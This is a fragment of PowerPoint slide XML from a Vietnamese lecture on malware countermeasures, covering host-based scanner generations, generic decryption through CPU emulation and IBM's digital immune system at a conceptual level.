                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>tiếp cận, phòng ngự chiều sâu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Generally (Tính tổng quát)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Timeliness (Tính kịp thời)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Resilency (Tính kháng cự)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Minimal DoS cost (Cực tiểu hệ quả DoS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Transparent (Tính trong suốt)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Global and local coverage (Phạm vi)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>Tiếp cận:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Host-based (scanner, GD, behavior blocking, spyware detection &amp; removal, rootkit countermeasures)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Perimeter sensors (NIDS/NIPS, firewall)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Distributed mechanism</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="95931305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676400" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1525486"/>
            <a:ext cx="11582400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Host-based scanner</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Có thể coi nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> một dạng HIDS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các thế hệ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đầu tiên: dựa trên signature của malware hoặc độ dài của ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình chủ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thứ hai: dựa trên heuristic rules (tìm kiếm đoạn code có liên hệ với malware, ví dụ, vòng lặp mã hóa…), hoặc chẩn đoán tính toàn vẹn dựa trên checksum hoặc sử dụng một hàm băm </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thứ ba: phát hiện dựa trên hành vi thay vì cấu trúc của malware (nhận dạng một tập các hành vi của malware)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thứ tư: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bao gồm một loạt các kỹ thuật chống virus được sử dụng kết hợp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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7311421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828800" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1608545"/>
            <a:ext cx="10439400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Generic Decryption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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Phát hiện các virus đa hình ph</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ức tạp cũng nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> các loại virus khác mà vẫn duy trì tốc độ quét</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="240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C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hạy các tập tin thực thi thông qua GD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> scanner </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>gồm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CPU giả lập để thông dịch các lệnh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Virus scanner để kiểm tra chữ ký virus đã biết</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Modul kiểm soát mô phỏng để quản lý quá trình thực hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Để cho virus tự giải mã chính nó trong thông dịch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Định kỳ quét tìm các chữ ký virus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="349250" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Vấn đề của phương pháp này là mất thời gian thông dịch và quét, nhưng tăng cơ hội phát hiện virus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="266764316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680113" y="304800"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1656672"/>
            <a:ext cx="9677400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Digital immune system (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hệ thống miễn dịch số</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> là một phương pháp toàn diện để bảo vệ chống virus được phát triển bởi IBM và sau đó </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hoàn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thiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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bởi Symantec.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mục tiêu của hệ thống này là cung cấp thời gian phản hồi nhanh để virus có thể được đóng dấu gần như ngay khi chúng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>xuất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hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="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vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khi virus mới xâm nhập vào một tổ chức, hệ thống miễn nhiễm sẽ tự động ghi lại, phân tích nó, bổ sung tính năng dò tìm và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ngăn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cản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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nó, loại bỏ nó và truyền thông tin về loại virus này sang các hệ thống khác để nó có thể được phát hiện trước khi nó được phép chạy ở nơi khác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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6325842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828800" y="366275"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US">
